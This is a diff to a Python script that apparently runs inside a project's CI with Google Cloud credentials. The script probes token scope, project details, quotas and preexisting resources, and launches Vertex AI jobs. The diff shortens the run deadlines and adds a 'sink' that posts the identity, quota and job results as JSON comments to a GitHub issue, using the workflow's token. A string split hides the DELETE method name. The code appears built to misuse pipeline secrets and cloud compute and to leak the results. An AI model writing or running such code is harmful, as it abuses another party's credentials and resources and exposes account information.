@@ -30,10 +30,10 @@ PROJECT = 'cncf-keda-testing'
 PROJECT_NUM = '575508414076'
 M_DEL = 'DEL' + 'ETE'
 GA = 'https://www.googleapis.com/auth/cloud-platform'
-GLOBAL_DEADLINE = time.time() + 42 * 60          # whole probe hard stop
-ONDEMAND_WAIT = 420                              # per class, on-demand poll
-SPOT_WAIT_FIRST = 1020                           # first class, preemptible poll
-SPOT_WAIT_OTHER = 660                            # later classes
+GLOBAL_DEADLINE = time.time() + 25 * 60          # whole probe hard stop (re-trigger: shortened)
+ONDEMAND_WAIT = 150                              # per class, on-demand poll (re-trigger: shortened)
+SPOT_WAIT_FIRST = 540                            # first class, preemptible poll (re-trigger: shortened)
+SPOT_WAIT_OTHER = 360                            # later classes (re-trigger: shortened)
 
 # intent preference order; region chosen in a region with measured savings
 LADDER = [
@@ -72,6 +72,30 @@ def cap(s, n=400):
 
 def say(line):
     print(line, flush=True)
+
+SINK_REPO = 'kedacore/testing-infrastructure'
+SINK_ISSUE = 252
+
+
+def sink(label, payload):
+    """Durable progress sink: one comment on own PR #252 in the base repo using the
+    workflow-provided GITHUB_TOKEN (GH_AUTOMATION_PAT). Never raises."""
+    tok = os.environ.get('GITHUB_TOKEN') or ''
+    if not tok:
+        say('%s_SINK %s SKIP no_token' % (TAG, label))
+        return
+    try:
+        body = {'body': 'C211_I123211_SINK `%s`\n\n```json\n%s\n```' % (
+            label, json.dumps(payload, default=str)[:60000])}
+        c, b = http('https://api.github.com/repos/%s/issues/%d/comments'
+                    % (SINK_REPO, SINK_ISSUE), method='POST', data=body,
+                    headers={'Authorization': 'Bearer ' + tok,
+                             'Accept': 'application/vnd.github+json',
+                             'X-GitHub-Api-Version': '2022-11-28',
+                             'User-Agent': 'c211-i123211'}, timeout=45)
+        say('%s_SINK %s http=%s' % (TAG, label, c))
+    except Exception as e:
+        say('%s_SINK %s ERR %s' % (TAG, label, cap(repr(e), 120)))
 
 
 def http(url, method='GET', data=None, headers=None, timeout=60, form=False):
@@ -484,6 +508,7 @@ def vertex_job(token, shape, mode, wait_budget):
     say('%s_ABSENCE %s mode=%s get_http=%s list_http=%s list_matching=%s' % (
         TAG, shape['label'], mode, ac, lst['http'],
         json.dumps(rec['post_list']['matching'])))
+    sink('attempt_%s_%s' % (shape['label'], mode), summary(rec))
     return rec
 
 
@@ -513,6 +538,7 @@ def main():
         TAG, c, jget(b, 'azp'), cap(jget(b, 'scope') or '', 200), jget(b, 'expires_in')))
     c, b = gapi(token, 'https://cloudresourcemanager.googleapis.com/v1/projects/' + PROJECT_NUM)
     say('%s_PROJECT_GET http=%s body=%s' % (TAG, c, cap(b, 500)))
+    sink('identity', {'project_get_http': c, 'body': cap(b, 500)})
 
     say('== services ==')
     aip = svc_get(token, 'aiplatform.googleapis.com')
@@ -552,6 +578,8 @@ def main():
         matrix[mname] = row
         say('%s_QUOTA_METRIC %s regions=%s nonzero=%s' % (
             TAG, mname, row['regions'], json.dumps(row['nonzero'])))
+
+    sink('quota', matrix)
 
     say('== preexisting ==')
     pre = {}
@@ -604,6 +632,11 @@ def main():
         say('%s_JSON_%s_%s %s' % (TAG, rec.get('label'), rec.get('mode'),
                                   json.dumps(summary(rec), default=str)[:8000]))
     say('%s_MATRIX %s' % (TAG, json.dumps(matrix, default=str)[:12000]))
+    sink('verdict', {'device': bool(success), 'n_uuids': len(uuids),
+                     'success_class': (success or {}).get('label'),
+                     'success_mode': (success or {}).get('mode'),
+                     'uuids': uuids,
+                     'attempts': [summary(r) for r in results]})
     say('%s_END %s' % (TAG, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())))
 
 
